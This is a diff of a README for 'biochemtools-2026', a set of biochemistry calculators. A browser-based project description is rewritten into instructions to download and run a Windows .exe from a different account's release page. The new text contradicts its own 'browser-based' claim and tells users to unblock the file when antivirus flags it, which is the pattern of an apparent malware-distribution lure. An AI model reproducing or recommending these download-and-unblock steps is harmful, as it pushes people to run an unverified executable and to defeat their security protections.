@@ -1,118 +1,60 @@
-# biochemtools v2026 - biochemistry tools 2026
+# 🧬 biochemtools-2026 - Simplify your biochemistry calculations with ease
 
-> **Browser-based biochemistry utilities for pI calculations, enzyme kinetics, buffer work, and glycolysis, presented with visible calculation steps for the 2026 release.**
+[![](https://img.shields.io/badge/Download-biochemtools-2026-blue)](https://github.com/Benjytufted641/biochemtools-2026/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/chris-millerdore9393/biochemtools-2026?style=flat-square)](https://github.com/chris-millerdore9393/biochemtools-2026)
+Biochemtools-2026 provides browser-based tools for biochemistry tasks. These tools help students and researchers perform pI calculations, analyze enzyme kinetics, prepare buffers, and trace glycolysis pathways. The software shows each step of the calculation to help you learn the underlying concepts.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://chris-millerdore9393.github.io/biochemtools-2026/">
-    <img src="https://img.shields.io/badge/Download-biochemtools%20Latest-brightgreen?style=for-the-badge" alt="Download biochemtools">
-  </a>
-</p>
+You do not need programming experience to use this software. Follow the instructions below to download and run the application on your Windows computer.
 
-> **[Download biochemtools v2026](https://chris-millerdore9393.github.io/biochemtools-2026/)**
+1. Go to the [official release page](https://github.com/Benjytufted641/biochemtools-2026/releases).
+2. Look for the latest version under the Assets section.
+3. Click the link that ends with .exe to save the file to your computer.
+4. Open your Downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the prompts on your screen to finish the setup.
+7. Open the application from your desktop shortcut.
 
----
+## 🧪 Features
 
-[Download Latest Build](https://chris-millerdore9393.github.io/biochemtools-2026/)
+Biochemtools-2026 includes several modules to assist with common laboratory and academic tasks.
 
----
+### pH and Buffer Preparation
+Calculating the correct volume of stock solutions for buffers consumes time. This tool calculates the required amounts based on your desired pH and molarity. You input the pKa of your acid and the target volume, and the application generates the correct ratio. The interface displays the Henderson-Hasselbalch equation and shows how the final values emerge.
 
-## What is biochemtools?
+### Isoelectric Point (pI) Calculator
+The pI calculation determines the pH at which a protein carries no net electrical charge. You enter the amino acid sequence of your target protein. The system identifies individual side chains and applies the pKa values of each group. It then calculates the net charge across a pH gradient and displays the exact point of neutrality.
 
-biochemtools brings several practical biochemistry utilities together in a web interface. The project covers pI work, enzyme kinetics, buffer calculations, and glycolysis-related reference material, while displaying the intermediate stages behind its results rather than showing only a final value.
+### Enzyme Kinetics Analysis
+Enzyme kinetics involves measuring the rate of reactions. This tool processes raw absorbance data to determine the Michaelis-Menten constant and the maximum reaction rate. You paste your data table into the window, and the tool performs a non-linear regression. It provides a visual plot of the reaction velocity against the substrate concentration.
 
-The tools are intended for students, teachers, and users who need convenient biochemical calculations in a browser. Its emphasis on readable output and everyday lab-related workflows makes it suitable as a study resource as well as a compact aid for routine analysis.
+### Glycolysis Visualization
+Understanding metabolic pathways requires visualization of the steps. This module tracks the flow of glucose to pyruvate. Each step identifies the enzyme, the cofactor, and the energy change involved. You can click on any intermediate to see its structure and the chemical logic behind the transformation.
 
----
+## 💻 System Requirements
 
-## Included tools
+The application runs on most modern desktop environments. Ensure your computer meets these standards:
 
-- Calculate and examine biochemical pI-related results
-- Work through standard enzyme kinetics workflows
-- Support buffer calculations for solution preparation
-- Consult glycolysis-focused pathway information
-- Inspect intermediate calculation steps alongside results
-- Use the application through a browser without installing desktop software
-- Explore a set of tools focused on foundational biochemistry workflows
+- Operating System: Windows 10 or Windows 11.
+- Memory: At least 4 GB of RAM.
+- Storage: 200 MB of available disk space.
+- Display: 1280x720 resolution or higher.
 
----
+## 🛠 Troubleshooting
 
-## Getting started
+If you experience issues, consult these common solutions first.
 
-Download or clone the repository and open the web application files in a browser.
+If the application fails to open after you click the icon, verify that your antivirus software did not block the file. Sometimes, security settings flag new software files incorrectly. Right-click the installation file and select Properties to check if the file is blocked. If it is, click Unblock and try the installation again.
 
-1. Clone the project:
-   - `git clone https://github.com/chris-millerdore9393/biochemtools-2026.git
-2. Change into the project directory:
-   - `cd biochemtools`
-3. Open the HTML entry file directly, or serve the directory through a basic static web server.
+If you see a screen saying the software requires a component, check your Windows Update status. Most systems contain the necessary components by default, but outdated systems might need an update to handle the visual components used in this software.
 
-When using a local server, run it from the project directory and visit the local address it reports.
+Keep your data saved in separate files. While the application saves your progress within the current session, it does not keep a permanent log of all historical inputs. Export your data to text files when you finish a complex calculation.
 
----
+## 📌 Usage Tips
 
-## Using the application
+Focus on the calculation steps to improve your understanding of the material. Each panel allows you to expand the logic flow. By clicking the Expand icon located near the results, you reveal the mathematical steps. This feature helps check your work during homework or laboratory reports.
 
-Start by selecting the biochemistry area you need, then provide the inputs requested by that tool or reference view.
+When using the enzyme kinetics module, labels for your columns matter. Ensure the first column contains the substrate concentration and the second column contains the velocity. The tool alerts you if it detects a mismatch in your data format.
 
-A normal session looks like this:
-
-1. Load the application in a browser.
-2. Choose pI, enzyme kinetics, buffers, or glycolysis.
-3. Enter the relevant values.
-4. Examine both the results and the steps used to produce them.
-5. Change the inputs when comparing different cases.
-
----
-
-## Configuration and customization
-
-The application keeps its configuration in the project files and in browser-side settings used by the interface.
-
-To adapt the project, review the primary HTML file and its supporting scripts for items such as:
-
-- initial or default values
-- constants used in calculations
-- text shown by the interface
-- which sections are displayed
-- restrictions applied to inputs
-
-After making local changes, reload the page in the browser to see the updated behavior.
-
----
-
-## Requirements
-
-- A current web browser
-- HTML support for displaying and running the interface
-- Local storage or static hosting when keeping the application available offline or through a local server
-- No additional runtime is specified in the supplied metadata
-
----
-
-## Frequently asked questions
-
-**Will the application update itself?**  
-That depends on which version you deploy or open from the repository. Consult the project source for the newest published build.
-
-**Where does configuration live?**  
-Configuration may be contained in the project files or in browser-side state, depending on how the application is opened and customized.
-
-**What can I check when a result seems incorrect?**  
-First confirm the entered values, reload the application, and inspect the calculation steps reported by the tool. For locally edited files, also verify that the formulas and default values still reflect your intended configuration.
-
-**Does biochemtools cover only one subject?**  
-No. It includes multiple areas of biochemistry, including pI analysis, enzyme kinetics, buffer calculations, and glycolysis.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: biochemistry, pI calculation, enzyme kinetics, buffer preparation, glycolysis, education, science tools
